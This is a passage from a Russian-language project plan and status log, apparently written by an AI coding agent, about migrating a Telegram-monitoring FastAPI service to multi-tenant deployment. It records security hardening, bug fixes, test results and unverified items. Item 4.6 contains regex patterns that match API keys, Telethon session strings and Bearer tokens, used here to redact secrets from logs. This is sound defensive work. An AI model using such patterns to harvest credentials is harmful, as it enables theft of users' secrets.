healthcheck живого сервиса. **Долг:** config-as-code (railway.json) у Railway deprecated до 2026-12-01 — мигрировать на infrastructure-as-code вместе с первым живым деплоем (записано в докстринге test_70). Прогон: **233 passed, 3 skipped**; ruff чист. **Коммит `beba765`** |
| 7.1 Два сервиса Railway — **исправление** | ✅ готово | 2026-09-04 | ревью нашло, что `Procfile` остался на `uvicorn server:app`: утверждение «монолит не запустим даже случайно» было неверным — Procfile читают foreman/hivemind, Heroku и Railway с NIXPACKS-билдером. `test_70_deploy.py` проверял Dockerfile и railway.json, но не Procfile — тест зелёный, дыра живая (AGENTS.md §10). Procfile переведён на `app.main:app` + процесс `worker`; `server.py` добавлен в `.dockerignore` (глубина защиты: `docker run <image> uvicorn server:app` работал в обход CMD; `app/` монолит не импортирует). Три новых теста |
| 7.2 Заголовки безопасности | ✅ готово (поведенческие на ASGITransport: заголовки на странице, /health и 404) | 2026-09-04 | `app/security/headers.py` + middleware в `app/main.py` (регистрируется ПЕРВЫМ — заголовки вешаются на ВСЕ ответы, включая 404/429: страница ошибки — тоже HTML в браузере, а не «отдельный эндпоинт»). **CSP**: `default-src 'self'`; **`script-src 'self'` БЕЗ `unsafe-inline`** — суть задачи и ВТОРОЙ рубеж после экранирования 5.2: прорвавшийся XSS не исполняется, браузер отказывает инлайн-скрипту; стало возможно после 5.1 (инлайн-скрипты вырезаны) и 5.3 (страницы входа — внешний auth-pages.js без инлайн-обработчиков, ошибки через textContent). `style-src 'self' 'unsafe-inline'` ОСОЗНАННО: страницы входа держат инлайн-СТИЛИ, стили не исполняют код — план требует запретить именно скрипты. Замыкания обходов: `object-src 'none'`, `base-uri 'none'` (`<base>` подменяет корень скриптов), `form-action 'self'`, `frame-ancestors 'none'` (кликджекинг, ремень к X-Frame-Options), `img-src 'self' data:` (аватарки-заглушки; data:-картинка код не исполняет), `connect-src 'self'`. HSTS `max-age=31536000` без includeSubDomains (на сервисном *.up.railway.app распространялся бы на поддомены сервиса без нужды — включить при своём домене), `X-Content-Type-Options: nosniff`, `Referrer-Policy: strict-origin-when-cross-origin`, `X-Frame-Options: DENY`. `test_71_security_headers.py` → 4 passed: все 5 заголовков на странице; то же на `/health` и 404 (заголовки — middleware); script-src без unsafe-inline/unsafe-eval + замыкания; разрешители style/img/connect. **Красная фаза:** 4 failed на assert. **Не подтверждено:** живой браузер под CSP (реальный отказ инлайн-скрипта, загрузка страниц входа с инлайн-стилями), HSTS вживую (нужен HTTPS-домен). Прогон: **237 passed, 3 skipped**; ruff/mypy чисты. **Коммит `9a10a2b`** |
| **Раздельный деплой Vercel + Railway** | ✅ готово в репо | 2026-09-04 | основной режим — переписывание `/api/*` и `/auth/*` на Vercel: браузер видит один origin, cookie остаются первой стороной. Прямой межсайтовый режим поддержан (CORS + `SameSite=None`), включается явно и предупреждает в логе. `app/security/cookies.py` знает про публичные суффиксы: наивное сравнение сочло бы `x.vercel.app` и `y.vercel.app` родственниками и выдало бы cookie, видимую чужим приложениям на Vercel. `vercel.json`, `docs/DEPLOY.md`. **Закрыт В11:** фронтенд шлёт `X-CSRF-Token` и `credentials: 'include'` |
| **Кэш настроек раздваивался** | ✅ исправлено | 2026-09-04 | корень трёх загадок недели, включая падение теста писем в CI. `importlib.reload(app.config)` в тестах оставляет тот же модуль, но пересоздаёт функции — модули, связавшие `get_settings` на импорте, остаются на старой с её кэшем. В процессе жили ДВА кэша настроек: один модуль видел заполненный Settings, другой пустой. В каждой точке наблюдения значение было верным — решил зонд внутри мейлера. Reload убран, `prepend_sys_path = .` из alembic.ini тоже (относительный путь дал бы вторую копию пакета). Регрессию держат два теста |
| **К2 — перенос монолита** | ✅ закрыт | 2026-09-04 | все ~40 эндпоинтов `server.py` перенесены в `app/api/`: мониторы, посты, журнал, интеграции, проверки, лента, диалоги, выход из Telegram, автоочистка, каталог моделей, адреса вкладок SPA. Три эндпоинта удалены осознанно (`GET/POST /api/settings` — ключи только из ENV, задача 1.2; `POST /api/webhook/send-payload` — открытый релей, задача 4.4), четыре переименованы в `/api/telegram/*`. Каждый роутер за `require_user`, чтения через `TenantRepo`, чужой ресурс → 404. Свип изоляции расширен на изменяющие методы и растёт вместе с роутерами автоматически. **Найдено и исправлено по пути:** очистка журнала и ленты в монолите шла без `WHERE user_id` (стёрла бы данные всем тенантам); `reset-dedup` — тоже; уникальность `monitors.public_id` была глобальной (канал второго пользователя молча не переносился); тесты ходили в настоящий OpenRouter — добавлен запрет исходящей сети в прогоне |
| Воркер — тело цикла | ✅ готово (поведенческие на aiosqlite; шлюз Telegram — двойник, живой MTProto не трогается) | 2026-09-05 | Тик: подобрать брошенные задачи → разобрать очередь `jobs` (`poll_monitor`, `reanalyze_feed_item`, потолок 20 за тик) → опросить просроченные мониторы → суточная автоочистка. Граница с Telegram вынесена в `app/services/tg_gateway.py`. Диспетчер `app/services/dispatch.py` — порт server.py:882 в разрезе тенанта. Монитор ищется по паре (user_id, public_id): `public_id` уникален только внутри пользователя. **Исправлено при связывании:** (1) успешный вебхук в оригинале делал `return` до записи в ленту — история наполнялась только у тех, у кого n8n выключен или падает; (2) `fetch_channel_messages` кладёт `date` ISO-строкой, а `filter_new` ждал `datetime` — первый реальный опрос падал бы на вставке; (3) `chat_avatars` впервые получила точку записи (до этого таблица только читалась — аватарок не появлялось никогда). **Не подтверждено:** живой Telegram и живой n8n |
| 7.3 CI — **зелёный живой прогон** | ✅ готово | 2026-09-04 | пять джобов зелёные в GitHub Actions (run 33871856262): security, lint, typecheck, test (Postgres 16), secret-scan. **В CI 256 passed, 4 skipped** — поведенческие тесты Alembic (1.4) и переноса данных (1.5) реально отработали на живой базе, единственный пропуск — база оператора, которой в чекауте нет |
| 1.4 / 1.5 — **подтверждены** | ✅ готово (живой Postgres в CI) | 2026-09-04 | блокер снят: джоб test поднимает Postgres и отдаёт TEST_DATABASE_URL, поэтому вердикт выносит прогон в среде с базой (AGENTS.md §4), а не skip. По пути CI вскрыл **два настоящих дефекта скрипта переноса**: (1) падение на NOT NULL, если `updated_at` в старой `integrations_config` пуст — а он пуст у всех, кто не сохранял настройки интеграций; (2) перенос сохранял PK старой базы, из-за чего **второй тенант падал** с duplicate key. Оба были невидимы, пока тест читал живую базу автора: там и значение заполнено, и тенант один |
| Фаза 6 — кнопка входа через Google | ✅ готово (поведенческие на ASGITransport + структурные по страницам и JS; живой Firebase не трогается) | 2026-09-05 | Бэкенд Фазы 6 был готов с 4 сентября, но кнопки не существовало ни на одной странице — функция была реализована и недоступна. Добавлены: публичный `GET /auth/google/config` (значения из ENV, а не зашиты в HTML — иначе смена проекта Firebase требует пересборки фронтенда), кнопка на `/login` и `/signup`, скрытая пока Firebase не настроен, и обмен ID-токена на свою cookie-сессию в `auth-pages.js` (SDK грузится динамически по нажатию, версия закреплена точно). **CSP расширяется только когда Google настроен** — за выключенную функцию не платят ослаблением политики; `'unsafe-inline'` не появляется ни при каком раскладе. **Не подтверждено:** живой вход через Firebase — нужен проект оператора; порядок включения (Railway ENV → authorized domains → CSP в `vercel.json`) описан в `docs/DEPLOY.md` |
| 7.4 Документация и отставка монолита | ✅ готово | 2026-09-05 | `server.py` (~2000 строк, ~40 эндпоинтов без auth) удалён; `README.md` и `PROJECT_OVERVIEW.md` переписаны под мульти-тенант, Postgres, два процесса и фактический список маршрутов. Трипваер `test_75_monolith_retired.py`: файла нет, его никто не импортирует, документация не предлагает `uvicorn server:app` и описывает оба процесса. Заодно: скан секретов (`test_01`) и запрет записи `.env` (`test_11`) переведены с перечня файлов на каталоги `app/` + `scripts/` (новый модуль проверяется сам), тест раздачи ассетов перенесён с монолита на `app.main` — после удаления файла он вечно писал бы skip. Закрыты К2, В10, С13, С15, С17 |
| 7.3 CI | ✅ готово (живой прогон в GitHub Actions) | 2026-09-04 | пять джобов: security (bandit + pip-audit), lint (ruff check + format), typecheck (mypy), test (pytest + сервис Postgres 16 с `TEST_DATABASE_URL`), secret-scan (gitleaks по всей истории и рабочему дереву). `.gitleaks.toml` разрешает плейсхолдер api_hash в README **по значению, а не по файлу** — контрольная проверка подтверждает, что настоящий ключ в том же файле по-прежнему ловится. **Найдено CI на первом прогоне:** голый `pytest -q` падал с `ModuleNotFoundError: app` — локально работало только через `python -m pytest`, который кладёт CWD в `sys.path`; добавлен `pytest.ini` с `pythonpath = .`, теперь команда из AGENTS.md §3 работает как написана. **Найдено при выполнении:** Dockerfile объявлял python 3.11, mypy.ini — 3.12, локальное окружение — 3.13; типы проверялись против языка, которого нет в проде — `mypy.ini` приведён к 3.11, тест сверяет версию с Dockerfile |
| Консолидация PLAN.md | ✅ готово | 2026-09-04 | план существовал в двух копиях: живая вне git (`Teleton/PLAN.md`), версионированная — заморожена на 0 из 23 закрытых чекбоксов при 17 реальных. Клонировавший репозиторий агент получал неверный статус (AGENTS.md §9). Живой документ переехал в `FastAPI/docs/PLAN.md`, в корне остался указатель, ссылки в `CLAUDE.md` обновлены, возврат дубля закрыт тестом |
| 4.7 Прочие исправления корректности | ✅ готово (поведенческие на aiosqlite/фейк-клиенте; /health — трипваер) | 2026-09-02 | Четыре дефекта плана, все — в новой сборке: (1) **С16** — `save_integration_secrets` наследовал дефект `get_setting` (`if webhook_url:` глотал `""` как None): контракт переписан — None = «поле не передано» (не затирает, 0.3), `""` = «очистить» (колонка обнуляется); проверено параметризованно на всех трёх секретах + обратный случай (None не трогает соседей). (2) **SET-инъекция** — порт `update_integration_config` (server.py:251 строил `SET {k} = ?` из ключей словаря): белый список `_CONFIG_FIELDS` из 6 несекретных колонок, ключ вне списка → ValueError (не молча: подмена `user_id` уводила бы строку в чужой тенант); секретные поля в список НЕ входят — только через save_integration_secrets (единственная точка шифрования, 3.4). (3) **С23** — `app/services/messages.py: fetch_channel_messages` (порт fetch_chat_messages, клиент инъектируется, entity уже разрешён): `continue` вместо `break` — закреп старее cutoff приходит РАНЬШЕ свежих постов, break терял ВСЁ новое; объём ограничен limit у iter_messages (тест: limit доходит до клиента). (4) **С22** — `/health` трипваер: `resp.json() == {"status": "ok"}` строго (новая сборка уже отвечала правильно с 2.3 — тест держит навсегда). `test_46_misc_fixes.py` → 12 passed. **Красная фаза:** 6 падений (3×""-очистка, 2×белый список DID NOT RAISE, закреп `[] != [2,3]`), 6 уже зелёных (компаньоны None/limit/поля + трипваер). **Ошибка теста, исправлена в тесте:** `integration_secrets` возвращает ключ `telegram_bot_token`, не `bot_token` — маппинг kwarg→dict-ключ (`_SECRETS_KEY`). **Не подтверждено:** порядок пинов в живом iter_messages Telethon (фикс по букве плана: continue + limit; живой канал — Фаза 5). Прогон: **186 passed, 4 skipped**. **Фаза 4 закрыта полностью.** **Коммит `acdcde4`** |
| 4.6 Секреты не попадают в журнал | ✅ готово (поведенческий тест на aiosqlite + структурный свип) | 2026-09-02 | `app/services/journal.py`: `redact(text)` — три скомпилированных паттерна (`sk-or-[\w-]+`, `\d{8,10}:[\w-]{35}` — StringSession Telethon, `Bearer\s+\S+`) → `[REDACTED]`, окружающий текст сохраняется (диагностика без секрета ценна); `add_log` — ЕДИНСТВЕННАЯ точка записи LogEntry, details затирается ДО записи. Список паттернов расширяемый: новый секрет = новый паттерн + новый параметр теста. `llm.py` переписан на add_log: `_log_limit` (LLM_LIMIT) и ветка ошибок API (OPENROUTER_ERROR) — текст исключения httpx несёт заголовки с Bearer, redact затирает до записи. Структурный свип `test_only_journal_writes_log_entries` запрещает `LogEntry(` вне journal.py НАВСЕГДА (новые писатели — роутеры Фазы 5, воркер — только через add_log); свип пропускает `models/` — `class LogEntry(Base)` это ДЕКЛАРАЦИЯ, не запись (ложное срабатывание первой версии). Сценарный тест: broken_caller падает с `Authorization: Bearer sk-or-live-key` в тексте → в журнале секрета НЕТ, «401» сохранён. `test_45_secrets_in_logs.py` → 9 passed. **Красная фаза:** redact = identity, add_log пишет сырое — 8 падений на assert + 1 уже зелёный (тесты redact падают на заглушке-identity). **Не подтверждено:** отсутствие ДРУГИХ форм секретов (паттерны покрывают три известных; новый источник секрета = новый паттерн). Прогон: **174 passed, 4 skipped**. **Коммит `3f2348b`** |
| 4.5 Лимиты на LLM | ✅ готово (поведенческий тест на aiosqlite; OpenRouter не трогается — caller инъекцируется) | 2026-09-02 | Три защиты: (1) `truncate_posts` — потолок 48к символов на запрос, режем ХВОСТ (голова — свежие посты — уходит целиком), короткий батч не калечется; (2) месячный счётчик — новая таблица `llm_usage` (модель + миграция `0002_llm_usage`, UNIQUE(user_id, period YYYY-MM)): списание — атомарный upsert-инкремент ON CONFLICT DO UPDATE (воркер + ручной запуск не теряют токены), `monthly_tokens_used` видит ТОЛЬКО текущий период и своего тенанта; (3) гейт `process_messages_batch_with_llm` — порт структуры payload оригинала ({post:[{ID,пост,ссылка}]}), лимит уже превышен → None БЕЗ обращения к API + LogEntry; пересечение лимита этим запросом → токены списаны (usage.total_tokens из ответа), `openrouter_enabled = False` (автоотключение) + LogEntry. Дефолтный `openrouter_caller`: Bearer-ключ расшифрованный из Integration (3.4), follow_redirects=False, usage из ответа — тест на MockTransport (заголовок Authorization, /chat/completions, usage парсится). Ошибки API — в LogEntry, текст исключения пока сырой (пойдёт через redact в 4.6). `test_44_llm_limits.py` → 8 passed. **Красная фаза:** заглушка-порт оригинала (без потолка/счётчика/гейта) — 7 падений на assert. **Не подтверждено:** реальные списания в OpenRouter (caller в бою — Фаза 5). Прогон: **165 passed, 4 skipped**. **Коммит `5f5ee21`** |
| 3.5 Пул Telethon-клиентов | ✅ готово (поведенческий тест на фейковом клиенте; живой Telegram не трогается) | 2026-09-02 | `app/services/tg_pool.py: TelegramClientPool` — живёт ТОЛЬКО у воркера (4.1; web держит короткоживущих — 3.3, два долгоживущих на одном auth-key это AUTH_KEY_DUPLICATED). Лимит живых клиентов 20 + LRU-вытеснение (OrderedDict: «холодные» — голова, вытесненные отключаются); sweep_idle (простой > 10 мин — отключаем, disconnect ждём ДО возврата: fire-and-forget = утечка); один asyncio.Lock на пользователя (берёт вызывающий цикл воркера, get() внутрь не лезет); close() для SIGTERM. Клиент строится фабрикой (Protocol SupportsLifecycle — фейк в тестах / TelegramClient на StringSession в бою), сессия приходит УЖЕ расшифрованной; смена сессии (перелогин) — старый клиент отключается, новый поднимается. `flood_guarded_call`: FloodWaitError НЕ ретраится и НЕ роняет цикл — retry_after в on_flood_wait (монитор запишет), вызов → None, цикл пропускается; guard НИКОГДА не спит (Telethon ждёт inline, при seconds > 300 вешает воркера; порог FLOOD_WAIT_SKIP_THRESHOLD = 300). `test_34_tg_pool.py` → 8 passed: лимит+LRU, переиспользование (фабрика 1 раз), смена сессии, щётка (граница idle_timeout НЕ простой — ошибка первой версии теста: точка 602 зацепила обоих, фикс 601), lock на пользователя, FloodWait 600s: цикл жив, retry_after отдан, elapsed < 1s, close() опустошает пул. Прогон: **120 passed, 4 skipped**. **Фаза 3 закрыта полностью.** **Коммит `fd5f526`** |
| 3.4 Шифрование секретов | ✅ готово (поведенческий тест на aiosqlite; проверка старта — в subprocess) | 2026-09-02 | Фундамент (encrypt/decrypt Fernet) заложен в 3.2; здесь закрыто остальное. `app/services/integrations.py`: bot_token / openrouter_api_key / webhook_url пишутся ТОЛЬКО через encrypt() (колонки *_encrypted), читаются расшифрованными через `integration_secrets()` — роутеры Фазы 5 получают dict, не сырую строку; upsert по user_id, опущенный секрет не затирает записанный (пустой POST не вытирает ключ — 0.3). `validate_encryption_key()` в crypto.py вызывается при импорте app.main: приложение ОТКАЗЫВАЕТСЯ СТАРТОВАТЬ без ключа и с коротким/битым (Fernet требует 32 url-safe байта) — иначе однажды прод заведётся с ключом «по умолчанию». `test_33_crypto.py` → 7 passed: шифротекст без открытого текста + roundtrip; чужой ключ → InvalidToken; все три секрета зашифрованы в колонках + расшифровка; частичное обновление не затирает соседей; отказ старта без ключа и с «short» (причина названа) + контрольный старт с валидным ключом. Проверка старта — ПОДПРОЦЕСС (import app.main в живом процессе тестов уже случился; ENV затирается явно — .env несёт боевой ключ, pydantic берёт ENV поверх файла). Прогон: **112 passed, 4 skipped**. **Коммит `fd87363`** |
| 3.3 Telegram-вход: state в БД | ✅ готово (поведенческий тест на aiosqlite, Telethon-клиент подменён фейком) | 2026-09-02 | `app/api/telegram.py` (`/api/telegram/send-code`, `/api/telegram/sign-in`) — порт /api/auth/* из server.py с исправлением мульти-тенантной дыры: глобальный словарь `auth_state` (server.py:39) заменён строкой `tg_auth_attempts` юзера (TTL 10 мин; новая попытка отменяет старую); sign-in берёт phone/phone_code_hash СТРОГО из своей строки — этих полей в теле НЕТ, `phone_code_hash` наружу не отдаётся; успешный вход сохраняет сессию зашифрованной (3.2) и съедает попытку; FloodWait не ретраится. send-code — под лимитом 3/час (закрывает хвост задачи 2.7, чек-лист В9). Клиент короткоживущий (`app/services/tg_auth.py`: connect → yield → disconnect; без API-ключей — 503): долгоживущие — только у воркера (AUTH_KEY_DUPLICATED). `test_32_auth_state.py` → 6 passed: параллельные входы не конфликтуют; чужой hash из тела игнорируется (записанный вызов Telethon проверяется); шифрование + съедание попытки; истёкший TTL → 400; 4-й send-code → 429; TTL = 10 мин. **Инфраструктурные ловушки тестов:** anon-токен CSRF не проходит при живой cookie сессии (2.6 by design) — `_act_as` выдаёт токен, подписанный sid; httpx нормализует хост `test` в `test.local` — cookie надо ставить на `test.local`, иначе молчаливый 403; дубль cookie в jar → CookieConflict (чистить по domain/path/name). mypy.ini заведён: telethon без py.typed — точечный override. Прогон: **105 passed, 4 skipped**. **Коммит `6f1ca6f`** |
| 8.2 Перенос старых данных (скрипт) | ✅ готово (поведенческий уровень, aiosqlite) | 2026-09-06 | `0ba96b6`: `scripts/migrate_sqlite_to_pg.py` дополняет базу, а не заменяет; шифрованный импорт `.session` с `--verify-telegram`, квитанции в `legacy_import_rows` (ревизия `0007`), редактирование секретов в журналах, идемпотентность. `docs/MIGRATE_LEGACY.md`. **Не подтверждено:** боевой перенос, живой Postgres |
| 9.1–9.3 Надёжность воркера | ✅ готово (поведенческий уровень, aiosqlite) | 2026-09-07 | `ddc464a`: резервирование сообщения до доставки (`sent_messages.processed`), независимые `bot_status`/`webhook_status`, `retry_after` на аккаунте и задаче, прогресс частичного анализа, лидерство воркера через advisory-lock Postgres. 15 сценариев в `test_90_worker_recovery.py`. **Не подтверждено:** живой Postgres, живой Telegram |
| 9.10 Идентификатор канала на стыке | ✅ готово (статический + поведенческий) | 2026-09-07 | найдено владельцем: «Редактировать» не открывает модалку, тоггл молчит. API отдаёт `public_id`, интерфейс читал монолитный `m.id` — `data-monitor-id` превращался в строку `"undefined"`, PATCH уходил на `/api/monitors/undefined` и получал 404. До 9.8 обработчики не исполнялись из-за CSP, поэтому дефект был не виден. Плюс интервал 12 часов в обеих формах |
| 11.8 Одно слово и снятие двойников | ✅ готово (свип + поведенческий) | 2026-09-10 | во всём, что видит пользователь, — «источник»: свип по разметке, модулям и строковым литералам кода (докстринги и комментарии не трогаются, там история терминов уместна). Снят `/api/monitors`: два API над одной таблицей уже разошлись однажды (11.6а), и второй раз ждать незачем; `clean_target` и сброс дедупликации переехали в `sources.py`, сброс теперь в разрезе источника — соседний источник на том же канале свою историю сохраняет. Ревизия `0014` сняла колонки-двойники с `monitors` (второй шаг двухшаговой выкладки) со страховочным доливом каналов на случай, если `0012` где-то не отработала. **Переразбор карточки ленты пошёл тем же конвейером:** посты группируются по каналам, у каждого свой промпт, затем сведение — иначе он отвечал по другим правилам. **Отложено:** расход токенов в разрезе источника и канала |
| 11.6 + 11.7 API источников и вкладка «Источники» | ✅ готово (поведенческий + статический) | 2026-09-10 | `/api/sources`: CRUD источника и каналов, идемпотентный запуск (повторный `run` при живой задаче возвращает ЕЁ `job_id`), статус прогона, потолки названы в тексте отказа (10 каналов, 8000 символов, 100 стоп-слов), дубль канала — 409, чужой источник — 404. **Канал добавляется по ссылке и разрешается конвейером при первом опросе:** зависимость, добывающая клиента Telegram, отвечает 400 раньше проверки владельца — на чужой источник приходило бы «аккаунт не подключён» вместо 404. Вкладка «Каналы» стала «Источники»: карточка с чипами каналов, модалка с каналами (у каждого свой лимит и промпт), стоп-слова, промпт оформления; кнопка запуска гаснет и опрашивает статус у сервера, а не рисует оптимистично. `channels.js` → `sources.js`. **Найдено своим же свипом:** переезд унёс кнопку «Из диалогов» — обработчик остался, элемента не стало; заведена проверка, что модуль не ищет несуществующих элементов |
| 11.4 + 11.5 Конвейер map → reduce, исходы и возобновление | ✅ готово (поведенческий уровень) | 2026-09-10 | `poll_source` обходит каналы источника: разрешение **`chat_id` → ссылка → обновить оба** (закрывает 9.15), свой лимит и свой промпт у каждого канала, стоп-слова, дедупликация по источнику. Разбор — по каналу, затем сведение промптом источника; один канал стоит один запрос (промпты склеиваются). Неразобранные каналы названы в конце сообщения строкой, которую пишет **система**, а не модель. Находок нет — бот молчит, карточка в ленте есть. **Параллельность map отложена осознанно:** `AsyncSession` не рассчитан на одновременные операции, а разбор ведёт учёт токенов в той же сессии — гонка в базе ради экономии минут не стоит того; каждый вызов ограничен тайм-аутом. **Возобновление (11.5):** вердикты и удачные чанки копятся в `payload_json` задачи, повтор не переспрашивает разобранное; потолок 3 попытки, потом доставляется собранное; настройки заморожены в payload на старте; канал с `fail_streak` = 5 отключается. `poll_monitor` удалён — 186 строк мёртвого кода |
| 9.19 Сводка с таблицей доезжает таблицей | ✅ готово (поведенческий уровень) | 2026-09-09 | владелец получил стену из чёрточек: модель ответила Markdown-таблицей на 15 вакансий, а `sendMessage` таблиц не знает вовсе. Доставка переведена на **`sendRichMessage`** (Bot API 10.1) — 32768 символов вместо 4096, `<table bordered striped compact>`, `<h1>`–`<h6>`, `<ul>/<ol>`; `parse_mode` с ним не передаётся. Markdown-таблица разбирается в настоящую, экранирование ячеек сохранено. Запасной путь через `sendMessage` остаётся и **разворачивает** таблицу в строки: стена из `|` хуже отсутствия таблицы. Он включается только если не ушло ещё ничего — иначе отказ на втором куске означал бы доставку сводки дважды. **Проверено по документации, а не по памяти:** знание модели обрывается до 10.1, и я сперва усомнился в существовании метода |
| 9.18 Модалка правки и промпт переразбора | ✅ готово (статический + поведенческий) | 2026-09-09 | найдено владельцем: «кнопка редактирования не нажимается». Обработчик находился, идентификатор верный (9.10), поля заполнялись — а `openEditModal` не показывал модалку вовсе: не хватало одной строки. Отличить «не сработало» от «сработало и ничего не показало» пользователю нечем. Свип теперь ловит весь класс: модалка, которую умеют закрывать, но не открывать. **Второй дефект, найденный по ходу:** «🔄 Обновить анализ» переспрашивал модель БЕЗ промпта канала (плановый разбор передаёт `custom_prompt`, переразбор — нет). Переразбор карточки Finder.work с промптом на 4311 символов возвращал ответ по умолчанию, и выглядело это как «модель стала хуже отвечать». **Проверено по вопросу владельца:** переразбор ничего не отправляет ни в бота, ни в n8n — только обновляет карточку; поведение верное и закреплено тестом, чтобы доставка не появилась там по недосмотру |
| 11.3 Стоп-слова до обращения к модели | ✅ готово (поведенческий уровень) | 2026-09-09 | `app/services/stopwords.py`: список по строке на слово (потолок 100, без повторов), совпадение подстрокой без учёта регистра — осознанный компромисс, поэтому отсеянное ВСЕГДА посчитано. Ищем только в тексте поста: стоп-слово, совпавшее с именем канала в ссылке, вырезало бы канал целиком и необъяснимо. Два правила против тихой потери: отсеянный пост остаётся виденным и помечается обработанным (иначе вернулся бы на следующем прогоне, чтобы отсеяться снова, и никогда не попал бы под автоочистку), а «всё отсеяно» — отдельный исход `SKIPPED_STOPWORDS`, а не «новых нет»: слишком широкое стоп-слово иначе выглядит как замолчавший канал. Счётчик едет с батчем — он нужен и в карточке ленты, не только в журнале |
| 11.2 Дедупликация в разрезе источника | ✅ готово (поведенческий уровень) | 2026-09-09 | ключ `(user_id, chat_id, message_id)` → частичный уникальный `(monitor_id, chat_id, message_id) WHERE monitor_id IS NOT NULL`. Прежний был верен, пока монитор равнялся каналу; с источниками пост, увиденный первым источником, для второго переставал существовать — и выглядело бы это как «второй источник не работает». Тенантность не потеряна, а усилена: источник принадлежит пользователю, разрез стал строго уже. Ревизия `0013` создаёт новый ключ ДО снятия старого (наоборот — окно без уникальности) и снимает старое ограничение по составу колонок, а не по угаданному имени. **Названо честно:** строки удалённого источника остаются с `NULL` и в ключ не входят, поэтому пересозданный источник разберёт посты заново — это следствие модели (другой источник = другие критерии), а объём ограничен окном выборки `offset_hours`, а не всей историей. Обновлены три существующих контракта с объяснением прямо в тестах |
| 11.1 Источник и его каналы: модель и перенос | ✅ готово (модель — везде, перенос — живой Postgres в CI) | 2026-09-09 | `monitor_channels` (свой промпт извлечения, свой лимит, `position`, `fail_streak`), у источника — `title`, `answer_prompt`, `stop_words`, `last_run_at`, `running`; у задачи — `attempts`; у `sent_messages` и `feed_items` — `monitor_id` с **`ON DELETE SET NULL`**: каскад означал бы, что пересозданный источник зальёт в n8n все старые посты заново. Каналы, наоборот, `CASCADE` — сами по себе не значат ничего. Ревизия `0012` переносит каждый существующий канал в источник с одним каналом (промпт, лимит, интервал сохраняются) и привязывает историю; повторный прогон не создаёт второго канала. Поведение не меняется: старые колонки `monitors` живут до `0013` — миграции поднимаются ДО старта нового кода, и ревизия «создать и удалить разом» дала бы минуту 500-х у живого старого процесса. `chat_target` стал необязательным: у источника своего канала нет |
| 11.0 Воркер никого не ждёт (она же 9.16) | ✅ готово (поведенческий уровень) | 2026-09-09 | найдено на проде 9 сентября: воркер перестал отмечаться, оставаясь живым (`seconds_since_beat` 213 → 226 → 249), процесс не падал — помог только перезапуск при выкладке. У внешних вызовов воркера не было тайм-аута НИ ОДНОГО: у HTTP-клиента OpenRouter свой (45 с), у MTProto — никакого, и вызов Telethon, который не возвращается, останавливал тик целиком, а с ним очередь, расписание и очистку. Появились `_within` (потолок на вызов), `TELEGRAM_TIMEOUT`, `TICK_BUDGET`. **Уточнён контракт 10.2:** удар сердца перестал быть отметкой ПРОЦЕССА и стал отметкой ПРОДВИЖЕНИЯ — ставится после каждой единицы работы. Долгий, но идущий прогон виден живым; зависший вызов до следующей отметки дойти не даёт, и воркер по-прежнему выглядит мёртвым. Отдельной задачей по таймеру этого делать нельзя — она отмечалась бы и при вставшем тике, и свип это запрещает. **Дефект первой реализации:** обёртка на `wait_for` подписывала своим тайм-аутом и отказ самого вызова — поймано тестом 9.11; переписано на `asyncio.timeout` с `expired()`. Предусловие Фазы 11 |
| 9.17 Разметка доезжает разобранной | ✅ готово (поведенческий уровень) | 2026-09-09 | найдено владельцем: анализ «AI Engineers Jobs» приходит в бота со звёздочками `**Ключевая суть**`, а «Finder.work» — оформленным. Догадка владельца о промптах подтвердилась ровно: у Finder.work промпт 4311 символов и прямо требует HTML с примерами `<b>`, у остальных четырёх промпт пуст или про разметку молчит — модель отвечает Markdown, а доставка шлёт с `parse_mode=HTML`. Правкой промптов не чинится: промпт не гарантия (модель отклоняется, версии меняются, промпты пишут пользователи). `app/services/telegram_markup.py`: Markdown → теги, готовый HTML насквозь, остальное экранируется, у `<a>` выживает только href с http(s)/tg. **Заодно:** `_summary_text` не экранировал чужой текст, а `_chunks` резал по 3900 вслепую — тег пополам, 400 от Bot API, повтор без `parse_mode` и оформление пропадало у ВСЕГО сообщения от одного знака `<` в чужом посте |
| 8.6b Сквозной проход С АНАЛИЗОМ | ✅ подтверждено живым прогоном | 2026-09-09 | через минуту после переноса ключа: карточка ленты 07:12:22Z, `model_name` = `deepseek/deepseek-v4-flash-0731` (модель владельца, не устаревшая из старой базы), текст анализа на месте, `delivery_status` = SUCCESS, в журнале `AI_ANALYSIS/SUCCESS` и `TG_BOT_SENT/SUCCESS`. Цепочка Telegram → дедупликация → LLM → доставка ботом отработала целиком. **Осталось:** доставка в n8n (тумблер вебхука выключен) |
| 10.2b Перенос в уже используемый кабинет | ✅ **выполнен на проде** | 2026-09-09 | задача 1.5 писалась под ПУСТОЙ кабинет, а владелец успел месяц работать: строка `integrations` есть, два канала из пяти заведены руками. В этом состоянии скрипт делал не то: `integrations` вставлялись с `ON CONFLICT (user_id) DO NOTHING` — ключ, токен и вебхук молча не приезжали, а отчёт был успешным; `monitors` дедуплицировались по `(user_id, public_id)`, и заведённый руками канал приезжал вторым экземпляром (опрос дважды, посты в n8n парами). Правило: **перенос дополняет, а не спорит** — пустое в назначении заполняется, заполненное остаётся (это выбор владельца), канал узнаётся по `chat_id`/`chat_target`, а не по строке. `DO UPDATE` снабжён `WHERE`: без него повторный запуск отчитывался «перенесена 1 строка», не изменив ничего — счётчик, врущий в покое, обесценивает проверку идемпотентности. **Боевой прогон 9 сентября:** monitors=3 (два уже заведённых не продублировались), sent_messages=192, feed_items=8, logs=308, integrations=1, settings=5; повторный запуск — все нули. Файл старой базы ушёл в контейнер через `railway ssh` (stdin, sha256 сверен) и удалён после переноса; база наружу не открывалась |
| 9.14 Поля интеграций показывают, что в базе | ✅ готово (поведенческий + node) | 2026-09-09 | требование владельца: «инпуты должны быть заполнены текущими значениями; часть скрыта, по глазику — показываются». Граница 0.3 (К3) проведена заново **по смыслу поля**: адрес вебхука и ID получателя — конфигурация, а не удостоверение (адрес нельзя проверить и починить, не видя его), уходят владельцу целиком; ключ OpenRouter и токен бота — удостоверения: в обычном ответе настроек их по-прежнему нет, показ — отдельный `POST /api/{openrouter,telegram-forward}/reveal` с записью в журнал. Прежнее правило рождалось в монолите, где тот же ответ уходил **анониму**: опасность была не в показе хозяину, а в показе кому угодно. В поле лежит маска с флагом — она уходит при первом клике и никогда не отправляется (иначе дописанный к маске символ записался бы вместо ключа). **Найдено попутно:** свип 0.3 выродился после 5.1 — искал `@app.<метод>`, а Фаза 5 перевела роуты на `@router.<метод>`; он честно зеленел на 4 статических страницах вместо 46 эндпоинтов. Добавлен счётчик (меньше 30 — падение) и проверка функций-помощников на границе HTTP |
